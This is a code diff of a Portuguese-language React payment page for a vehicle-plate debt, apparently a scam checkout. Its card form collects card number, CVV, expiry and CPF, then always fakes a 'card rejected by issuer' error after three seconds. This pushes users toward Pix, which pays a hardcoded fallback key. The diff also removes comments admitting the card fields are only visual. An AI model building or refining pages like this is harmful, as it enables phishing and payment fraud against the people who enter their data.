@@ -13,7 +13,7 @@ const ubuntu = Ubuntu({
   weight: ['400', '500', '700'],
 })
 
-// Função para geração da string estruturada do Pix Copia e Cola
+// Geração do código Pix Copia e Cola estruturado
 function gerarCopiaEColaReal(chave: string): string {
   const merchantAccount = `0014BR.GOV.BCB.PIX01${chave.length.toString().padStart(2, '0')}${chave}`;
   const payloadFormat = "000201";
@@ -43,25 +43,21 @@ function gerarCopiaEColaReal(chave: string): string {
 }
 
 export function PagamentoClient({ placa }: { placa: string }) {
-  // Controle das três etapas na mesma página: 'dados' -> 'metodo' -> 'pix_gerado'
   const [etapa, setEtapa] = useState<'dados' | 'metodo' | 'cartao' | 'pix_gerado'>('dados')
   
-  // Estados para armazenamento das informações do formulário
   const [nome, setNome] = useState('')
   const [telefone, setTelefone] = useState('')
   const [email, setEmail] = useState('')
   
-  // Estados visuais do cartão (não utilizados para processamento)
-const [numeroCartao, setNumeroCartao] = useState('')
-const [nomeCartao, setNomeCartao] = useState('')
-const [validadeCartao, setValidadeCartao] = useState('')
-const [cvvCartao, setCvvCartao] = useState('')
-const [cpfCartao, setCpfCartao] = useState('')
+  const [numeroCartao, setNumeroCartao] = useState('')
+  const [nomeCartao, setNomeCartao] = useState('')
+  const [validadeCartao, setValidadeCartao] = useState('')
+  const [cvvCartao, setCvvCartao] = useState('')
+  const [cpfCartao, setCpfCartao] = useState('')
 
-const [processandoCartao, setProcessandoCartao] = useState(false)
-const [erroCartao, setErroCartao] = useState(false)
+  const [processandoCartao, setProcessandoCartao] = useState(false)
+  const [erroCartao, setErroCartao] = useState(false)
 
-  // Estados referentes à chave puxada do painel e ao cronômetro
   const [chavePix, setChavePix] = useState<string>("")
   const [loadingPix, setLoadingPix] = useState<boolean>(false)
   const [copiado, setCopiado] = useState(false)
@@ -69,58 +65,109 @@ const [erroCartao, setErroCartao] = useState(false)
   const [segundosRestantes, setSegundosRestantes] = useState(1200)
   
   function pagarComCartao() {
-
-  setErroCartao(false)
-  setProcessandoCartao(true)
-
-  setTimeout(() => {
-
-    setProcessandoCartao(false)
-    setErroCartao(true)
-
-  }, 3000)
-
-}
+    setErroCartao(false)
+    setProcessandoCartao(true)
+    setTimeout(() => {
+      setProcessandoCartao(false)
+      setErroCartao(true)
+    }, 3000)
+  }
   
-    // Função para formatar o telefone em tempo real: (XX) XXXXX-XXXX
+  // --- MÁSCARAS DE FORMATAÇÃO ---
   function formatarTelefone(valor: string) {
-    const limpo = valor.replace(/\D/g, '') // Remove tudo o que não for número
+    const limpo = valor.replace(/\D/g, '')
     if (limpo.length <= 2) return limpo
     if (limpo.length <= 7) return `(${limpo.slice(0, 2)}) ${limpo.slice(2)}`
     return `(${limpo.slice(0, 2)}) ${limpo.slice(2, 7)}-${limpo.slice(7, 11)}`
   }
 
+  function formatarNumeroCartao(valor: string) {
+    const limpo = valor.replace(/\D/g, '')
+    return limpo.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ')
+  }
+
+  function formatarCPF(valor: string) {
+    const limpo = valor.replace(/\D/g, '')
+    return limpo
+      .slice(0, 11)
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+  }
+
+  function formatarValidadeCartao(valor: string) {
+    const limpo = valor.replace(/\D/g, '')
+    if (limpo.length <= 2) return limpo
+    return `${limpo.slice(0, 2)}/${limpo.slice(2, 4)}`
+  }
+
+  function formatarCVV(valor: string) {
+    return valor.replace(/\D/g, '').slice(0, 4)
+  }
+
+  // --- HANDLERS (CONTROLADORES DE MUDANÇA) ---
   function lidarMudancaTelefone(e: React.ChangeEvent<HTMLInputElement>) {
     setTelefone(formatarTelefone(e.target.value))
   }
 
-  // Validações em tempo real para acender o botão
+  function lidarMudancaNumeroCartao(e: React.ChangeEvent<HTMLInputElement>) {
+    setNumeroCartao(formatarNumeroCartao(e.target.value))
+  }
+
+  function lidarMudancaCPF(e: React.ChangeEvent<HTMLInputElement>) {
+    setCpfCartao(formatarCPF(e.target.value))
+  }
+
+  document.querySelectorAll('article').forEach(card => {
+    card.addEventListener('touchstart', function() {
+        const btn = this.querySelector('button');
+        if(btn) btn.style.opacity = '1';
+    });
+    card.addEventListener('touchend', function() {
+        const btn = this.querySelector('button');
+        if(btn) {
+            setTimeout(() => {
+                btn.style.opacity = '0';
+            }, 2000);
+        }
+    });
+  });
+
+  function lidarMudancaValidade(e: React.ChangeEvent<HTMLInputElement>) {
+    setValidadeCartao(formatarValidadeCartao(e.target.value))
+  }
+
+  function lidarMudancaCVV(e: React.ChangeEvent<HTMLInputElement>) {
+    setCvvCartao(formatarCVV(e.target.value))
+  }
+  // --- VALIDAÇÕES DE FORMULÁRIO ---
   const telefoneValido = telefone.replace(/\D/g, '').length === 11
   const emailValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
   const nomeValido = nome.trim().length >= 3
-  
-  // O botão só "acende" (fica ativo) se todas as 3 condições forem verdadeiras
   const formularioValido = nomeValido && telefoneValido && emailValido
 
-  // Valida e avança do formulário de dados para as opções de pagamento
+  // Validação para ativar o botão de pagamento por cartão
+  const cartaoValido = numeroCartao.replace(/\s/g, '').length >= 14 && 
+                       nomeCartao.trim().length >= 3 &&
+                       validadeCartao.length === 5 &&
+                       cvvCartao.length >= 3 &&
+                       cpfCartao.replace(/\D/g, '').length === 11
+
   function lidarProsseguir(e: React.FormEvent) {
     e.preventDefault()
     if (!formularioValido) return
     setEtapa('metodo')
   }
 
-    // Faz a requisição ao painel administrativo para obter a chave Pix ativa
   async function selecionarPix() {
     setLoadingPix(true)
     try {
       const res = await fetch("/api/admin/pix")
-      
       let chaveEncontrada = ""
 
       if (res.ok) {
         try {
           const d = await res.json()
-          // Tenta mapear o formato correto vindo da API do painel
           if (d && d.ok && d.data) {
             if (typeof d.data === 'string') {
               chaveEncontrada = d.data
@@ -133,15 +180,12 @@ const [erroCartao, setErroCartao] = useState(false)
         }
       }
 
-      // PLANO B (FALLBACK): Se a API falhar ou vier em branco, usa a chave estática padrão para não travar o fluxo do app
       if (!chaveEncontrada) {
-        console.warn("Aviso: Chave Pix não encontrada no painel. Usando chave padrão de contingência.")
         chaveEncontrada = "d5230cce-902a-4e8c-81be-fdd0a658e817"
       }
 
       setChavePix(chaveEncontrada)
         
-      // Tenta salvar o pedido de forma isolada no banco
       try {
         await fetch("/api/admin/pedidos/criar", {
           method: "POST",
@@ -156,10 +200,9 @@ const [erroCartao, setErroCartao] = useState(false)
           })
         })
       } catch (erroPedido) {
-        console.warn("Rota /api/admin/pedidos/criar falhou ou retornou vazio, ignorando para prosseguir.", erroPedido)
+        console.warn("Rota /api/admin/pedidos/criar falhou.", erroPedido)
       }
 
-      // Configuração do horário de expiração do código
       const agora = new Date()
       agora.setMinutes(agora.getMinutes() + 20)
       const horas = String(agora.getHours()).padStart(2, '0')
@@ -167,12 +210,8 @@ const [erroCartao, setErroCartao] = useState(false)
       setHorarioVencimento(`${horas}:${minutos}`)
       setSegundosRestantes(1200)
 
-      // Avança obrigatoriamente para a tela do QR Code
       setEtapa('pix_gerado')
-
     } catch (err) {
-      console.error("Erro geral no selecionarPix, forçando exibição:", err)
-      // Se der qualquer outro erro catastrófico, garante que o cliente ainda veja a tela de pagamento
       setChavePix("d5230cce-902a-4e8c-81be-fdd0a658e817")
       setEtapa('pix_gerado')
     } finally {
@@ -180,8 +219,6 @@ const [erroCartao, setErroCartao] = useState(false)
     }
   }
 
-
-  // Controle regressivo do contador de minutos/segundos na etapa do Pix
   useEffect(() => {
     if (etapa !== 'pix_gerado') return
     const cronometro = setInterval(() => {
@@ -221,7 +258,7 @@ const [erroCartao, setErroCartao] = useState(false)
 
       <div className="mx-auto max-w-[820px] px-5 pt-8">
         
-               {/* ETAPA 1: CAMPOS DE IDENTIFICAÇÃO DO CONDUTOR */}
+        {/* ETAPA 1: CAMPOS DE IDENTIFICAÇÃO DO CONDUTOR */}
         {etapa === 'dados' && (
           <div>
             <h2 className="text-2xl font-bold text-neutral-900 tracking-tight">
@@ -282,7 +319,7 @@ const [erroCartao, setErroCartao] = useState(false)
           </div>
         )}
 
-        {/* ETAPA 2: OPÇÕES DE PAGAMENTO (CONFORME O SEU LAYOUT ORIGINAL) */}
+        {/* ETAPA 2: OPÇÕES DE PAGAMENTO */}
         {etapa === 'metodo' && (
           <div>
             <div className="flex items-center gap-2 mb-1">
@@ -299,47 +336,32 @@ const [erroCartao, setErroCartao] = useState(false)
               Selecione abaixo como quer fazer o pagamento
             </p>
 
-           <div className="mt-8 divide-y divide-neutral-200/50 bg-white rounded-2xl px-6 border border-neutral-100 shadow-sm">
+            <div className="mt-8 divide-y divide-neutral-200/50 bg-white rounded-2xl px-6 border border-neutral-100 shadow-sm">
+              <button
+                type="button"
+                onClick={() => setEtapa('cartao')}
+                className="flex w-full items-center gap-4 py-6 text-left transition hover:bg-neutral-50 focus:outline-none"
+              >
+                <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#f2ff9d] border border-[#e1f56c]/30 p-1">
+                  <Image 
+                    src="/images/cardlogo.png" 
+                    alt="Cartão de Crédito" 
+                    width={50} 
+                    height={50} 
+                    className="object-contain" 
+                  />
+                </div>
+                <div className="flex-1 pr-2">
+                  <p className="font-bold text-neutral-800 text-[16px] leading-tight">
+                    Cartão de crédito
+                  </p>
+                  <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
+                    Cadastre seu cartão<br />e efetue o pagamento!
+                  </p>
+                </div>
+                <ChevronRight className="size-4 text-neutral-300" />
+              </button>
 
-  {/* Opção Cartão de Crédito */}
-  <button
-    type="button"
-    onClick={() => setEtapa('cartao')}
-    className="flex w-full items-center gap-4 py-6 text-left transition hover:bg-neutral-50"
-  >
-
-    <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#f2ff9d] border border-[#e1f56c]/30 p-1">
-
-      <Image 
-        src="/images/cardlogo.png" 
-        alt="Cartão de Crédito" 
-        width={50} 
-        height={50} 
-        className="object-contain" 
-      />
-
-    </div>
-
-
-    <div className="flex-1 pr-2">
-
-      <p className="font-bold text-neutral-800 text-[16px] leading-tight">
-        Cartão de crédito
-      </p>
-
-      <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
-        Cadastre seu cartão<br />
-        e efetue o pagamento!
-      </p>
-
-    </div>
-
-
-    <ChevronRight className="size-4 text-neutral-300" />
-
-  </button>
-
-              {/* Opção Pix - Ativa e Integradora */}
               <button
                 onClick={selecionarPix}
                 disabled={loadingPix}
@@ -366,122 +388,115 @@ const [erroCartao, setErroCartao] = useState(false)
             </div>
           </div>
         )}
+        {/* ETAPA CARTÃO */}
+        {etapa === 'cartao' && (
+          <div>
+            <div className="flex items-center gap-2 mb-5">
+              <button
+                type="button"
+                onClick={() => setEtapa('metodo')}
+                className="p-1 rounded-lg text-neutral-400 hover:text-neutral-600 focus:outline-none"
+              >
+                <ArrowLeft className="size-5" />
+              </button>
 
-{/* ETAPA CARTÃO */}
-{etapa === 'cartao' && (
-  <div>
+              <h2 className="text-2xl font-bold text-neutral-900">
+                Pagamento com cartão
+              </h2>
+            </div>
 
-    <div className="flex items-center gap-2 mb-5">
-      <button
-        type="button"
-        onClick={() => setEtapa('metodo')}
-        className="p-1 rounded-lg text-neutral-400 hover:text-neutral-600"
-      >
-        <ArrowLeft className="size-5" />
-      </button>
+            {processandoCartao && (
+              <div className="rounded-2xl bg-white p-8 text-center shadow-sm border">
+                <p className="font-bold text-lg animate-pulse">
+                  Processando pagamento...
+                </p>
+              </div>
+            )}
 
-      <h2 className="text-2xl font-bold text-neutral-900">
-        Pagamento com cartão
-      </h2>
-    </div>
+            {erroCartao && (
+              <div className="rounded-2xl bg-white p-8 shadow-sm border border-red-100">
+                <h3 className="text-xl font-bold text-red-600">
+                  Compra rejeitada
+                </h3>
+                <p className="mt-2 text-sm text-neutral-500">
+                  Compra rejeitada pela administradora do cartão
+                </p>
+                <button
+                  type="button"
+                  onClick={() => setErroCartao(false)}
+                  className="mt-4 text-xs font-bold text-neutral-500 hover:text-neutral-800 underline uppercase tracking-wider focus:outline-none"
+                >
+                  Tentar outro cartão
+                </button>
+              </div>
+            )}
 
-    {processandoCartao && (
-      <div className="rounded-2xl bg-white p-8 text-center shadow-sm border">
-        <p className="font-bold text-lg animate-pulse">
-          Processando pagamento...
-        </p>
-      </div>
-    )}
+            {!processandoCartao && !erroCartao && (
+              <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100 space-y-4">
+                {/* Input Número do Cartão com Máscara */}
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={numeroCartao}
+                  onChange={lidarMudancaNumeroCartao}
+                  placeholder="Número do cartão"
+                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
+                />
 
-    {erroCartao && (
-      <div className="rounded-2xl bg-white p-8 shadow-sm border border-red-100">
-        <h3 className="text-xl font-bold text-red-600">
-          Compra rejeitada
-        </h3>
-        <p className="mt-2 text-sm text-neutral-500">
-          Compra rejeitada pela administradora do cartão
-        </p>
-        <button
-          type="button"
-          onClick={() => setErroCartao(false)}
-          className="mt-4 text-xs font-bold text-neutral-500 hover:text-neutral-800 underline uppercase tracking-wider"
-        >
-          Tentar outro cartão
-        </button>
-      </div>
-    )}
+                {/* Input Nome do Titular */}
+                <input
+                  type="text"
+                  value={nomeCartao}
+                  onChange={(e) => setNomeCartao(e.target.value)}
+                  placeholder="Nome do titular"
+                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
+                />
 
-    {!processandoCartao && !erroCartao && (
-      <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100 space-y-4">
+                {/* Input CPF com Máscara */}
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={cpfCartao}
+                  onChange={lidarMudancaCPF}
+                  placeholder="CPF"
+                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
+                />
 
-        {/* Input Número do Cartão com Máscara */}
-        <input
-          type="text"
-          inputMode="numeric"
-          value={numeroCartao}
-          onChange={lidarMudancaNumeroCartao}
-          placeholder="Número do cartão"
-          className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
-        />
+                <div className="grid grid-cols-2 gap-3">
+                  {/* Input Validade com Máscara */}
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    value={validadeCartao}
+                    onChange={lidarMudancaValidade}
+                    placeholder="MM/AA"
+                    className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
+                  />
 
-        {/* Input Nome do Titular (Permite letras normais) */}
-        <input
-          type="text"
-          value={nomeCartao}
-          onChange={(e) => setNomeCartao(e.target.value)}
-          placeholder="Nome do titular"
-          className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
-        />
+                  {/* Input CVV com Máscara */}
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    value={cvvCartao}
+                    onChange={lidarMudancaCVV}
+                    placeholder="CVV"
+                    className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
+                  />
+                </div>
 
-        {/* Input CPF com Máscara */}
-        <input
-          type="text"
-          inputMode="numeric"
-          value={cpfCartao}
-          onChange={lidarMudancaCPF}
-          placeholder="CPF"
-          className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
-        />
-
-        <div className="grid grid-cols-2 gap-3">
-          
-          {/* Input Validade com Máscara */}
-          <input
-            type="text"
-            inputMode="numeric"
-            value={validadeCartao}
-            onChange={lidarMudancaValidade}
-            placeholder="MM/AA"
-            className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
-          />
-
-          {/* Input CVV com Máscara */}
-          <input
-            type="text"
-            inputMode="numeric"
-            value={cvvCartao}
-            onChange={lidarMudancaCVV}
-            placeholder="CVV"
-            className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
-          />
-
-        </div>
-
-        {/* Botão de Envio Dinâmico com Validação */}
-        <button
-          type="button"
-          onClick={pagarComCartao}
-          disabled={!cartaoValido}
-          className="w-full rounded-xl bg-black py-4 font-bold text-[#e5ff51] transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-neutral-900"
-        >
-          Continuar pagamento
-        </button>
-
-      </div>
-    )}
-
-  </div>
-)}
+                {/* Botão de Envio Dinâmico com Validação */}
+                <button
+                  type="button"
+                  onClick={pagarComCartao}
+                  disabled={!cartaoValido}
+                  className="w-full rounded-xl bg-black py-4 font-bold text-[#e5ff51] transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-neutral-900 focus:outline-none"
+                >
+                  Continuar pagamento
+                </button>
+              </div>
+            )}
+          </div>
+        )}
 
         {/* ETAPA 3: GERADOR DE PIX INTEGRADO NA TELA COM CONTADOR */}
         {etapa === 'pix_gerado' && (
@@ -534,8 +549,7 @@ const [erroCartao, setErroCartao] = useState(false)
 
       </div>
 
-      {/* O ResumoDebito fixo só aparece nas etapas 'dados' e 'metodo'.
-          Na etapa 'pix_gerado' o card de resumo do pedido já cobre essa informação. */}
+      {/* O ResumoDebito fixo só aparece nas etapas 'dados' e 'metodo'. */}
       {etapa !== 'pix_gerado' && (
         <div className="mx-auto mt-16 max-w-[820px] px-5">
           <ResumoDebito placa={placa} />
